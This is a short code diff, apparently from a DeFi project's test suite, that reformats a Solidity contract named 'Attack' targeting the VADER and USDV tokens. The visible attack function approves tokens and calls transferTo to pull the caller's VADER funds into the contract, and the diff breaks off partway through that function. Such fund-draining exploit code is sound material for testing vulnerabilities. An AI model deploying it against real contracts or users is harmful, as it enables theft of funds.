@@ -7,7 +7,7 @@ import "./interfaces/iVADER.sol";
 import "./interfaces/iUSDV.sol";
 import "./interfaces/iROUTER.sol";
 
-    //======================================VADER=========================================//
+//======================================VADER=========================================//
 contract Attack {
     bool private inited;
     address public VADER;
@@ -19,13 +19,13 @@ contract Attack {
 
     function init(address _vader, address _USDV) public {
         require(inited == false);
-inited = true;
+        inited = true;
         VADER = _vader;
         USDV = _USDV;
     }
 
     //========================================iERC20=========================================//
-    function attackUSDV(uint amount) public {
+    function attackUSDV(uint256 amount) public {
         iERC20(VADER).approve(USDV, amount);
         iERC20(USDV).approve(USDV, amount);
         iERC20(VADER).transferTo(address(this), amount); // get VADER funds
